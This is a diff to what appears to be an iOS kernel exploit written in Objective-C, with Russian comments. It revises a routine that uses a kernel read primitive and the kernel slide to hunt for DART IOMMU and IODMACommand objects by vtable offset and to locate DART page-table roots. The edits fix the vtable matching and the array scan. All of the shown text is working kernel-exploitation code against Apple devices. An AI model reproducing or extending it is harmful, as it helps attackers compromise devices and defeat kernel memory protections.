@@ -6621,10 +6621,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             uint64_t hFile = hvt ? hvt - ks4 : 0;
             kpNote(r, [NSString stringWithFormat:@"  [P2] dart-hop%d: obj=%#llx vt(file)=%#llx%@", h,
                       (unsigned long long)hopObj, (unsigned long long)hFile,
-                      hFile == 0x7dafcb0 ? @" = AppleT8110DART ✓" :
-                      hFile == 0x7e6ab28 ? @" = IODARTMapperNub" :
-                      hFile == 0x7e6b118 ? @" = IODARTMapper" : @""]);
-            if (hFile == 0x7dafcb0) { dartVA = hopObj; break; }
+                      (uint32_t)hFile == 0x7dafcb0 ? @" = AppleT8110DART ✓" :
+                      (uint32_t)hFile == 0x7e6ab28 ? @" = IODARTMapperNub" :
+                      (uint32_t)hFile == 0x7e6b118 ? @" = IODARTMapper" : @""]);
+            if ((uint32_t)hFile == 0x7dafcb0) { dartVA = hopObj; break; }   // 1.9.167: file-сравнение по low32 (hFile = полный prelink VA 0xfffffff0…)
             uint64_t nxt = kp_untag_ptr(early_kread64(hopObj + 0x30));
             if (nxt == hopObj) break;
             hopObj = nxt;
@@ -6664,8 +6664,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             uint64_t ecnt = kpLooksLikeKernelPointer(schVA) ? early_kread64(schVA + 0xb8) : 0;
             kpNote(r, [NSString stringWithFormat:@"  [P2] chain-B: scheduler=%#llx arr=%#llx count=%llu",
                       (unsigned long long)schVA, (unsigned long long)earr, (unsigned long long)ecnt]);
-            if (kpLooksLikeKernelPointer(earr) && ecnt && ecnt <= 384) {
-                for (uint64_t i = 0; i < ecnt && !cmdVA; i++) {
+            if (kpLooksLikeKernelPointer(earr)) {
+                for (uint64_t i = 0; i < 384 && !cmdVA; i++) {   // 1.9.167: count-поле мусорное — скан по массиву с фильтрами
                     uint64_t ep = kp_untag_ptr(early_kread64(earr + i * 8));
                     if (!kpLooksLikeKernelPointer(ep) || !kvtophys(ep)) continue;
                     if ((uint32_t)(early_kread64(ep + 0xc38) >> 32) != 0x10) continue;
@@ -6677,8 +6677,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         uint64_t cFile = cvt ? cvt - kslide2 : 0;
                         kpNote(r, [NSString stringWithFormat:@"    +%#x → cmd=%#llx vt(file)=%#llx%@",
                                   mo, (unsigned long long)cand, (unsigned long long)cFile,
-                                  cFile == 0x7afa9e8 ? @" = IODMACommand ✓" : @""]);
-                        if (cFile == 0x7afa9e8) cmdVA = cand;
+                                  (uint32_t)cFile == 0x7afa9e8 ? @" = IODMACommand ✓" : @""]);
+                        if ((uint32_t)cFile == 0x7afa9e8) cmdVA = cand;   // 1.9.167: low32-сравнение (cFile = prelink VA)
                     }
                 }
             }
@@ -6698,7 +6698,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             kpNote(r, [NSString stringWithFormat:@"  [P2] dart=%#llx vt=%#llx (file %#llx; ждём 0x7dafcb0)%@",
                       (unsigned long long)dartVA, (unsigned long long)dvt,
                       (unsigned long long)(dvt ? dvt - kslide2 : 0),
-                      dvt - kslide2 == 0x7dafcb0 ? @" ✓" : @""]);
+                      (uint32_t)(dvt - kslide2) == 0x7dafcb0 ? @" ✓" : @""]);
             // корень таблиц: group=[dart+0xc50] (транзиентная?) → [group+0x170]
             // segIdx=0; fallback — персистентный дубль [dart+0xcd0+i*8] → +0x80 (р.38)
             uint64_t tableRoot = 0;
